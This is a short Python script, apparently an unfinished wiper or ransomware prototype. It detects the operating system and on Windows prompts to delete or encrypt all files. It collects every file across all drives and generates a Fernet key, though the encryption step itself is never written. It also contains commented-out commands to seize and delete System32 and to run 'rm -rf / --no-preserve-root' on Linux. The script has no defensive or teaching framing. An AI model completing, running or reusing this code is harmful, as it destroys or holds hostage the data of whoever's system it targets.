import os
import subprocess
import platform
from cryptography.fernet import Fernet
from string import ascii_uppercase

def get_windrives_filenames():
    drives = []
    files = []
    for drive in ascii_uppercase:
        if os.path.exists(os.path.join(str(drive) + ":\\")):
            drives.append(str(drive) + ":\\")

    for i, drive in enumerate(drives):
        if(drive in os.getenv('windir') and not drive == ''):
            progf86_path = drive + 'Program Files (x86)\\' 
            progf_path = drive + 'Program Files\\'

            drives.append(progf86_path)
            drives.append(progf_path)
            drives.pop(i)
    for drive in drives:
        for root, _, filenames in os.walk(drive):
            for filename in filenames:
                files.append(os.path.join(root, filename))
    
    return [drives, files]


if(platform.system() == 'Windows'):
    print("Windows OS discovered. Getting System32's path...")
    delenc_choice = input('Del/Enc all files? ').lower()
    sys32_path = os.path.join(os.getenv("windir"), "System32")
    
    if(delenc_choice == 'del'):
        print('Starting deletion process...')

        # print('Taking ownership of System32...')
        # subprocess.run(['takeown', r'/f', sys32_path])
        # print('Deleting System32...')
        # subprocess.run(['cacls', sys32_path])
        # print('Done')

    elif(delenc_choice == 'enc'):
        print('Starting Encryption process...')

        key = Fernet.generate_key()
        keyfunc = Fernet(key)

        drives_list, filenames = get_windrives_filenames()

        print('Initiating encryption on ' + str(drives_list) + '...')



    else:
        print('Invalid input. Exiting.')


        
        



        

if(platform.system() == 'Linux'):
    print('Linux OS discovered.')

    # print('Deleting root...')
    # subprocess.run(['rm', '-rf', r'/', '--no-preserve-root'])
    # print('Done.')
